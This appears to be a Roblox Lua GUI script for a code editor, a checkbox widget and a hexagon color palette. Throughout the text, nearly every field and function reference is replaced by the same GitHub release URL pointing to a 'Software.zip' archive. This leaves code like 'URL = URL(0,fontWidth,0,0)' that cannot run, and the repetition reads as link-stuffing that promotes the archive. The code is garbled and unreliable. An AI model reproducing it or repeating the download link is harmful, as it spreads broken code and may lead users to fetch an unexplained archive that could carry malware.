				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-linesOffset+oldOffsets.X,1,oldOffsets.Y)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,fontWidth,0,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,#totalLinesStr*fontWidth,1,oldOffsets.Y)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local maxCols = 0
			local lines = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			
			for i = 1,#lines do
				local lineLen = #lines[i]
				if lineLen > maxCols then
					maxCols = lineLen
				end
			end
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = maxCols
			self:UpdateView()	
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"\n")
			self:MapNewLines()
			self:PreHighlight()
			self:Refresh()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,text,toEditor)
			if toEditor then
				return text:gsub("\t",(" %s%s "):format(tabSub,tabSub))
			else
				return text:gsub((" %s%s "):format(tabSub,tabSub),"\t")
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self) -- TODO: better (use new tab format)
			local source = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"\n")
			return self:ConvertText(source,false) -- Tab Convert
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,txt)
			txt = self:ConvertText(txt,true) -- Tab Convert
			local lines = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(lines)
			local count = 1

			for line in txt:gmatch("([^\n\r]*)[\n\r]?") do
				local len = #line
				lines[count] = line
				count = count + 1
			end
			
			self:ProcessTextChange()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local floor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local templates = {}

			for name,color in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				templates[name] = ('<font color="rgb(%s,%s,%s)">'):format(floor(color.r*255),floor(color.g*255),floor(color.b*255))
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = templates
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local colors = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = colors
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end

		local mt = {__index = funcs}

		local function new()
			if not builtInInited then initBuiltIn() end

			local scrollV = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			local scrollH = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(true)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,1,-16)
			local obj = setmetatable({
				FontSize = 15,
				ViewX = 0,
				ViewY = 0,
				Colors = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				ColoredLines = {},
				Lines = {""},
				LineFrames = {},
				Editable = true,
				Editing = false,
				CursorX = 0,
				CursorY = 0,
				FloatCursorX = 0,
				Text = "",
				PreHighlights = {},
				SelectionRange = {{-1,-1},{-1,-1}},
				NewLines = {},
				FrameOffsets = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0),
				MaxTextCols = 0,
				ScrollV = scrollV,
				ScrollH = scrollH
			},mt)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 3
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 2
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 7

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				obj:Refresh()
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				obj:Refresh()
			end)

			makeFrame(obj)
			obj:MakeRichTemplates()
			obj:ApplyTheme()
			scrollV:SetScrollFrame(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			obj:UpdateView()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("AbsoluteSize"):Connect(function()
				obj:UpdateView()
				obj:Refresh()
			end)

			return obj
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local funcs = {}
		local c3 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local v2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local ud2s = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local ud2o = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local ud = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local max = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local new = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local TweenSize = new("Frame").TweenSize
		local ti = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local delay = delay

		local function ripple(object, color)
			local circle = new('Frame')
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = color
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.75
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = v2(0.5, 0.5)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud2o()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud2s(0.5, 0.5)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = object
			local rounding = new('UICorner')
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud(1)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = circle

			local abssz = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local size = max(abssz.X, abssz.Y) * 5/3

			TweenSize(circle, ud2o(size, size), "Out", "Quart", 0.4)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(circle, ti(0.4, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip), {BackgroundTransparency = 1}):Play()

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(circle, 0.4)
		end

		local function initGui(self,frame)
			local checkbox = frame or create({
				{1,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Name="Checkbox",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
				{2,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Name="ripples",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,0),}},
				{3,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.10196078568697,0.10196078568697,0.10196078568697),BorderSizePixel=0,Name="outline",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
				{4,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14117647707462,0.14117647707462,0.14117647707462),BorderSizePixel=0,Name="filler",Parent={3},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,14,0,14),}},
				{5,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.90196084976196,0.90196084976196,0.90196084976196),BorderSizePixel=0,Name="top",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,0),}},
				{6,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.90196084976196,0.90196084976196,0.90196084976196),BorderSizePixel=0,Name="bottom",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,14),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,0),}},
				{7,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.90196084976196,0.90196084976196,0.90196084976196),BorderSizePixel=0,Name="left",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,16),}},
				{8,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.90196084976196,0.90196084976196,0.90196084976196),BorderSizePixel=0,Name="right",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,14,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,16),}},
				{9,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0.5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,ClipsDescendants=true,Name="checkmark",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0,0.5,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,20),}},
				{10,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0.5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Image="rbxassetid://6234266378",Parent={9},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0,0.5,0),ScaleType=3,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,15,0,11),}},
				{11,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0.5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://6401617475",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20784313976765,0.69803923368454,0.98431372642517),Name="checkmark2",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0,0.5,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,12,0,12),Visible=false,}},
				{12,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://6425281788",ImageTransparency=0.20000000298023,Name="middle",Parent={4},ScaleType=2,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,2),Visible=false,}},
				{13,"UICorner",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2),Parent={3},}},
			})
			local outline = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local filler = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local checkmark = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local ripples_container = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			-- walls
			local top, bottom, left, right = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = checkbox
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {
				Top = top,
				Bottom = bottom,
				Left = left,
				Right = right,
				Outline = outline,
				Filler = filler,
				Checkmark = checkmark,
				Checkmark2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				Middle = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			}

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(i)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					local release
					release = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
							release:Disconnect()

							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(checkbox) then
								if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 then
									ripple(ripples_container, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
								end

								if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
									self:SetState(not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,true)
								else
									self:Paint()
								end

								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
							end
						end
					end)
				end
			end)

			self:Paint()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,anim)
			local guiElems = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if anim then
				TweenSize(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, ud2o(14, 14), "In", "Quart", 4/15, true)
				TweenSize(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, ud2o(14, 14), "In", "Quart", 4/15, true)
				TweenSize(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, ud2o(14, 14), "In", "Quart", 4/15, true)
				TweenSize(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, ud2o(14, 14), "In", "Quart", 4/15, true)
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud2o(14, 14)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud2o(14, 14)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud2o(14, 14)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud2o(14, 14)
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,anim)
			local guiElems = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if anim then
				TweenSize(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, ud2o(14, 0), "InOut", "Quart", 4/15, true)
				TweenSize(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, ud2o(14, 0), "InOut", "Quart", 4/15, true)
				TweenSize(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, ud2o(0, 14), "InOut", "Quart", 4/15, true)
				TweenSize(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, ud2o(0, 14), "InOut", "Quart", 4/15, true)
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud2o(14, 0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud2o(14, 0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud2o(0, 14)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud2o(0, 14)
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local guiElems = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 then
				local color_base = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = color_base or (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local walls_color = color_base or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = walls_color
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = walls_color
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = walls_color
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = walls_color
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,val,anim)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = val

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
			local setStateTime = tick()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = setStateTime

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 then
					if anim then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, ti(4/15, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip), {BackgroundColor3 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip})
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
						delay(0.15, function()
							if setStateTime ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
							self:Paint()
							TweenSize(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, ud2o(14, 20), "Out", "Bounce", 2/15, true)
						end)
					else
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						self:Paint()
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud2o(14, 20)
					end
					self:Collapse(anim)
				else
					self:Paint()
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
				end
			else
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 then
					if anim then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, ti(4/15, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip), {BackgroundColor3 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip})
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
						delay(0.15, function()
							if setStateTime ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
							self:Paint()
							TweenSize(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, ud2o(0, 20), "Out", "Quad", 1/15, true)
						end)
					else
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						self:Paint()
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ud2o(0, 20)
					end
					self:Expand(anim)
				else
					self:Paint()
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == nil
				end
			end
		end

		local mt = {__index = funcs}

		local function new(style)
			local obj = setmetatable({
				Toggled = false,
				Disabled = false,
				OnInput = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(),
				Style = style or 0,
				Colors = {
					Background = c3(36,36,36),
					Primary = c3(49,176,230),
					Secondary = c3(25,25,25),
					Disabled = c3(64,64,64),
					DisabledBackground = c3(52,52,52),
					DisabledCheck = c3(80,80,80)
				}
			},mt)
			initGui(obj)
			return obj
		end

		local function fromFrame(frame)
			local obj = setmetatable({
				Toggled = false,
				Disabled = false,
				Colors = {
					Background = c3(36,36,36),
					Primary = c3(49,176,230),
					Secondary = c3(25,25,25),
					Disabled = c3(64,64,64),
					DisabledBackground = c3(52,52,52)
				}
			},mt)
			initGui(obj,frame)
			return obj
		end

		return {new = new, fromFrame}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local funcs = {}
		local paletteCount = 0
		local mouse = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		local hexStartX = 4
		local hexSizeX = 27
		local hexTriangleStart = 1
		local hexTriangleSize = 8

		local bottomColors = {
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(17,17,17),
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(99,95,98),
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(163,162,165),
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(205,205,205),
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(223,223,222),
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(237,234,234),
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(27,42,53),
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(91,93,105),
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(159,161,172),
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(202,203,209),
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(231,231,236),
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(248,248,248)
		}

		local function isMouseInHexagon(hex)
			local relativeX = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local relativeY = mouse.Y - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if relativeX >= hexStartX and relativeX < hexStartX + hexSizeX then
				relativeX = relativeX - 4
				local relativeWidth = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(relativeX,26 - relativeX))/13
				if relativeY >= hexTriangleStart + hexTriangleSize*relativeWidth and relativeY < https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - hexTriangleStart - hexTriangleSize*relativeWidth then
					return true
				end
			end

			return false
		end

		local function hexInput(self,hex,color)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and isMouseInHexagon(hex) then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(color)
					self:Close()
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and isMouseInHexagon(hex) then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(color)
				end
			end)
		end

		local function createGui(self)
			local gui = create({
				{1,"ScreenGui",{Name="BrickColor",}},
				{2,"Frame",{Active=true,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.1294117718935,0.1294117718935,0.1294117718935),Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.40000000596046,0,0.40000000596046,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,337,0,380),}},
				{3,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2352941185236,0.2352941185236,0.2352941185236),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),BorderSizePixel=0,Font=3,Name="MoreColors",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,1,-30),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-10,0,25),Text="More Colors",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,}},
				{4,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Image="rbxassetid://1281023007",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,0.33333334326744,0.49803924560547),Name="Hex",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,35,0,35),Visible=false,}},
			})
			local colorFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local hex = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			for row = 1,13 do
				local columns = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(row,14-row)+6
				for column = 1,columns do
					local nextColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(paletteCount).Color
					local newHex = hex:Clone()
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0, (column-1)*25-(columns-7)*13+3*26 + 1, 0, (row-1)*23 + 4)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nextColor
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					hexInput(self,newHex,nextColor)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = colorFrame
					paletteCount = paletteCount + 1
				end
			end

			for column = 1,12 do
				local nextColor = bottomColors[column]
				local newHex = hex:Clone()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0, (column-1)*25-(12-7)*13+3*26 + 3, 0, 308)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nextColor
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
				hexInput(self,newHex,nextColor)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = colorFrame
				paletteCount = paletteCount + 1
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				self:Close()
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = gui
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,vis)
			local colorFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,337,0,380 - (not vis and 33 or 0))
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = vis
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,x,y,prevColor)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = prevColor or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local reverseY = false

			local x,y = x or mouse.X, y or mouse.Y
			local maxX,maxY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
